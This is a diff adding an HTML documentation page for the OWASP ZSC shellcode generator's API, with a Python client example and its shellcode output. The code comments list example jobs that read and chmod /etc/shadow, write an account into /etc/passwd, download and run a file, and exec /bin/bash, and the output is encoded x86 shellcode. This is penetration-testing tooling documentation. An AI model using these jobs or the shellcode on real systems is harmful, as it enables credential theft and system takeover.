@@ -1,0 +1,315 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>API - OWASP ZSC | OWASP ZCR Shellcoder</title>
+  <meta name="author" content="Ali Razmjoo">
+
+  
+  <meta name="description" content="API Sep 26th, 2015 1:36 pm OWASP ZSC is available now in api.z3r0d4y.com.
+It&rsquo;s very simple to communicate with OWASP ZSC API. You have to &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://zsc.z3r0d4y.com/api/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="OWASP ZSC | OWASP ZCR Shellcoder" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-58921349-3']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">OWASP ZSC | OWASP ZCR Shellcoder</a></h1>
+  
+    <h2>Welcome To OWASP ZeroDay Cyber Research Shellcoder Home</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="zsc.z3r0d4y.com">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Home</a></li>
+  <li><a href="/wiki">Wiki</a></li>
+  <li><a href="/developers">Developers</a></li>
+  <li><a href="/download">Download</a></li>
+  <li><a href="/blog/archives">Tricks</a></li>
+  <li><a href="/api">API</a></li>
+  <li><a href="https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project">OWASP Page</a></li>
+  <li><a href="mailto:Ali[dot]Razmjoo[at]Owasp[dot]Org">Contact</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article role="article">
+  
+  <header>
+    <h1 class="entry-title">API</h1>
+    <p class="meta">
+
+
+
+
+<time class='entry-date' datetime='2015-09-26T13:36:00-04:00'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>26</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:36 pm</span></time></p>
+  </header>
+  
+  <p>OWASP ZSC is available now in <a href="http://api.z3r0d4y.com">api.z3r0d4y.com</a>.<br/>
+It&rsquo;s very simple to communicate with OWASP ZSC API. You have to using POST method and fill the values.<br/>
+Code Example:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#http://zsc.z3r0d4y.com/api</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">httplib</span><span class="o">,</span> <span class="nn">urllib</span>
+</span><span class='line'><span class="n">params</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">urlencode</span><span class="p">({</span>
+</span><span class='line'>                      <span class="s">&#39;api_name&#39;</span><span class="p">:</span> <span class="s">&#39;zsc&#39;</span><span class="p">,</span><span class="c">#it&#39;s API name, if you want use OWASP ZSC, You must fill it with &#39;zsc&#39; </span>
+</span><span class='line'>                      <span class="s">&#39;os&#39;</span><span class="p">:</span> <span class="s">&#39;linux_x86&#39;</span><span class="p">,</span><span class="c"># os name here</span>
+</span><span class='line'>                      <span class="s">&#39;job&#39;</span><span class="p">:</span> <span class="s">&#39;system(</span><span class="se">\&#39;</span><span class="s">cat[space]/etc/shadow</span><span class="se">\&#39;</span><span class="s">)&#39;</span><span class="p">,</span>
+</span><span class='line'>                      <span class="s">&#39;encode&#39;</span><span class="p">:</span> <span class="s">&#39;add_random&#39;</span><span class="p">})</span> <span class="c">#encoding type</span>
+</span><span class='line'>                      <span class="c">#function to use [ support: All except &quot;script_executor()&quot; ]</span>
+</span><span class='line'>                      <span class="c">#to see available features visit: http://zsc.z3r0d4y.com/table.html</span>
+</span><span class='line'>                      <span class="c">#inputs: same argv in terminal http://zsc.z3r0d4y.com/wiki/</span>
+</span><span class='line'>                      <span class="c">#&gt;zsc -os linux_x86 -encode none -job &quot;system(&#39;ls&#39;)&quot; -o file.txt</span>
+</span><span class='line'>                      <span class="c">#&gt;zsc -os linux_x86 -encode xor_random -job &quot;system(&#39;ls[space]-la&#39;)&quot; -o file.txt</span>
+</span><span class='line'>                      <span class="c">#&gt;zsc -os linux_x86 -encode xor_0x41414141 -job &quot;system(&#39;ls[space]-la[space]/etc/shadow;chmod[space]777[space]/etc/shadow;ls[space]-la[space]/etc/shadow;cat[space]/etc/shadow;wget[space]file[space];chmod[space]777[space]file;./file&#39;)&quot; -o file.txt</span>
+</span><span class='line'>                      <span class="c">#&gt;zsc -os linux_x86 -encode add_random -job &quot;system(&#39;wget[space]file;sh[space]file&#39;)&quot; -o file.txt</span>
+</span><span class='line'>                      <span class="c">#&gt;zsc -os linux_x86 -encode mix_all -job &quot;chmod(&#39;/etc/shadow&#39;,&#39;777&#39;)&quot; -o file.txt</span>
+</span><span class='line'>                      <span class="c">#&gt;zsc -os linux_x86 -encode inc -job &quot;write(&#39;/etc/passwd&#39;,&#39;user:pass&#39;)&quot; -o file.txt</span>
+</span><span class='line'>                      <span class="c">#&gt;zsc -os linux_x86 -encode dec_11 -job &quot;exec(&#39;/bin/bash&#39;)&quot; -o file.txt</span>
+</span><span class='line'><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s">&#39;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0&#39;</span><span class="p">}</span>
+</span><span class='line'><span class="n">conn</span> <span class="o">=</span> <span class="n">httplib</span><span class="o">.</span><span class="n">HTTPConnection</span><span class="p">(</span><span class="s">&#39;api.z3r0d4y.com&#39;</span><span class="p">)</span>
+</span><span class='line'><span class="n">conn</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s">&quot;POST&quot;</span><span class="p">,</span> <span class="s">&quot;&quot;</span><span class="p">,</span> <span class="n">params</span><span class="p">,</span> <span class="n">headers</span><span class="p">)</span>
+</span><span class='line'><span class="n">response</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">getresponse</span><span class="p">()</span>
+</span><span class='line'><span class="n">shellcode</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">,</span><span class="s">&#39;&#39;</span><span class="p">)</span>
+</span><span class='line'><span class="k">print</span> <span class="n">shellcode</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>output:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Ali</span>\<span class="n">Desktop</span><span class="o">&gt;</span><span class="n">zsc</span><span class="o">-</span><span class="n">api</span><span class="o">.</span><span class="n">py</span>
+</span><span class='line'>\<span class="n">x31</span>\<span class="n">xd2</span>\<span class="n">x52</span>\<span class="n">x68</span>\<span class="n">x45</span>\<span class="n">x32</span>\<span class="n">x76</span>\<span class="n">x78</span>\<span class="n">x5b</span>\<span class="n">x68</span>\<span class="n">xb5</span>\<span class="n">xcd</span>\<span class="n">x06</span>\<span class="n">x01</span>\<span class="n">x58</span>\<span class="n">xf7</span>\<span class="n">xd8</span>\<span class="n">x01</span>\<span class="n">xd8</span>\<span class="n">x50</span>\<span class="n">x59</span>\<span class="n">xc1</span>\<span class="n">xe9</span>\<span class="n">x08</span>\<span class="n">x51</span>\<span class="n">x68</span>\<span class="n">x6e</span>\<span class="n">x36</span>\<span class="n">x6a</span>\<span class="n">x65</span>\<span class="n">x5b</span>\<span class="n">x68</span>\<span class="n">x3f</span>\<span class="n">xc3</span>\<span class="n">x01</span>\<span class="n">x04</span>\<span class="n">x58</span>\<span class="n">xf7</span>\<span class="n">xd8</span>\<span class="n">x01</span>\<span class="n">xd8</span>\<span class="n">x50</span>\<span class="n">x68</span>\<span class="n">x66</span>\<span class="n">x36</span>\<span class="n">x58</span>\<span class="n">x78</span>\<span class="n">x5b</span>\<span class="n">x68</span>\<span class="n">x37</span>\<span class="n">xd1</span>\<span class="n">xe3</span>\<span class="n">x14</span>\<span class="n">x58</span>\<span class="n">xf7</span>\<span class="n">xd8</span>\<span class="n">x01</span>\<span class="n">xd8</span>\<span class="n">x50</span>\<span class="n">x68</span>\<span class="n">x61</span>\<span class="n">x75</span>\<span class="n">x49</span>\<span class="n">x31</span>\<span class="n">x5b</span>\<span class="n">x68</span>\<span class="n">xfe</span>\<span class="n">x13</span>\<span class="n">xd5</span>\<span class="n">x10</span>\<span class="n">x58</span>\<span class="n">xf7</span>\<span class="n">xd8</span>\<span class="n">x01</span>\<span class="n">xd8</span>\<span class="n">x50</span>\<span class="n">x89</span>\<span class="n">xe6</span>\<span class="n">x52</span>\<span class="n">x68</span>\<span class="n">x75</span>\<span class="n">x47</span>\<span class="n">x77</span>\<span class="n">x6e</span>\<span class="n">x5b</span>\<span class="n">x68</span>\<span class="n">xe5</span>\<span class="n">xb6</span>\<span class="n">x49</span>\<span class="n">x0b</span>\<span class="n">x58</span>\<span class="n">xf7</span>\<span class="n">xd8</span>\<span class="n">x01</span>\<span class="n">xd8</span>\<span class="n">x50</span>\<span class="n">x59</span>\<span class="n">xc1</span>\<span class="n">xe9</span>\<span class="n">x10</span>\<span class="n">x51</span>\<span class="n">x89</span>\<span class="n">xe1</span>\<span class="n">x52</span>\<span class="n">x6a</span>\<span class="n">x68</span>\<span class="n">x68</span>\<span class="n">x56</span>\<span class="n">x33</span>\<span class="n">x72</span>\<span class="n">x78</span>\<span class="n">x5b</span>\<span class="n">x68</span>\<span class="n">x27</span>\<span class="n">xd1</span>\<span class="n">x10</span>\<span class="n">x05</span>\<span class="n">x58</span>\<span class="n">xf7</span>\<span class="n">xd8</span>\<span class="n">x01</span>\<span class="n">xd8</span>\<span class="n">x50</span>\<span class="n">x68</span>\<span class="n">x4c</span>\<span class="n">x56</span>\<span class="n">x71</span>\<span class="n">x73</span>\<span class="n">x5b</span>\<span class="n">x68</span>\<span class="n">x1d</span>\<span class="n">xf4</span>\<span class="n">x07</span>\<span class="n">x05</span>\<span class="n">x58</span>\<span class="n">xf7</span>\<span class="n">xd8</span>\<span class="n">x01</span>\<span class="n">xd8</span>\<span class="n">x50</span>\<span class="n">x89</span>\<span class="n">xe3</span>\<span class="n">x52</span>\<span class="n">x57</span>\<span class="n">x56</span>\<span class="n">x51</span>\<span class="n">x53</span>\<span class="n">x89</span>\<span class="n">xe1</span>\<span class="n">x6a</span>\<span class="n">x09</span>\<span class="n">x58</span>\<span class="n">x83</span>\<span class="n">xc0</span>\<span class="n">x02</span>\<span class="n">x99</span>\<span class="n">xcd</span>\<span class="n">x80</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Ali</span>\<span class="n">Desktop</span><span class="o">&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Anyone can use this API on softwares or any OS which not supported to generate shellcodes.</p>
+
+<p>Thank you.</p>
+
+<p><a href="mailto:Ali[dot]Razmjoo[at]Owasp[dot]Org">Ali Razmjoo</a></p>
+
+  
+    <footer>
+      <p class="meta">
+        
+        
+
+
+
+
+<time class='entry-date' datetime='2015-09-26T13:36:00-04:00'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>26</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:36 pm</span></time>
+        
+      </p>
+      
+        <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://zsc.z3r0d4y.com/api/index.html" data-via="Ali_Razmjo0" data-counturl="http://zsc.z3r0d4y.com/api/index.html" >Tweet</a>
+  
+  
+  <div class="g-plusone" data-size="medium"></div>
+  
+  
+    <div class="fb-like" data-send="true" data-width="450" data-show-faces="false"></div>
+  
+</div>
+
+      
+    </footer>
+  
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/08/01/generate-pe-file-with-zsc-shellcodes/">Generate PE File With OWASP ZSC Shellcodes</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/07/27/video-how-to-install-and-generate-shellcode-using-zsc/">Video: How to Install and Generate Shellcode Using OWASP ZSC</a>
+      </li>
+    
+  </ul>
+</section>
+
+<section>
+  <h1>GitHub Repos</h1>
+  <ul id="gh_repos">
+    <li class="loading">Status updating...</li>
+  </ul>
+  
+  <a href="https://github.com/Ali-Razmjoo">@Ali-Razmjoo</a> on GitHub
+  
+  <script type="text/javascript">
+    $(document).ready(function(){
+        if (!window.jXHR){
+            var jxhr = document.createElement('script');
+            jxhr.type = 'text/javascript';
+            jxhr.src = '/javascripts/libs/jXHR.js';
+            var s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(jxhr, s);
+        }
+
+        github.showRepos({
+            user: 'Ali-Razmjoo',
+            count: 100,
+            skip_forks: true,
+            target: '#gh_repos'
+        });
+    });
+  </script>
+  <script src="/javascripts/github.js" type="text/javascript"> </script>
+</section>
+
+
+
+<section class="googleplus">
+  <h1>
+    <a href="https://plus.google.com/107173281386135128055?rel=author">
+      <img src="http://www.google.com/images/icons/ui/gprofile_button-32.png" width="32" height="32">
+      Google+
+    </a>
+  </h1>
+<br><center><a href="https://owasp.org/"><img src="https://www.owasp.org/skins/owasplogo.png"></a></center>
+</section>
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+<center><font color = "white">
+  Copyright &copy; 2016 - <strong>Ali Razmjoo</strong>
+</font></center>
+</p>
+
+</footer>
+  
+
+
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) {return;}
+  js = d.createElement(s); js.id = id; js.async = true;
+  js.src = "//connect.facebook.net/en_US/all.js#appId=212934732101925&xfbml=1";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+
+
+  <script type="text/javascript">
+    (function() {
+      var script = document.createElement('script'); script.type = 'text/javascript'; script.async = true;
+      script.src = 'https://apis.google.com/js/plusone.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(script, s);
+    })();
+  </script>
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
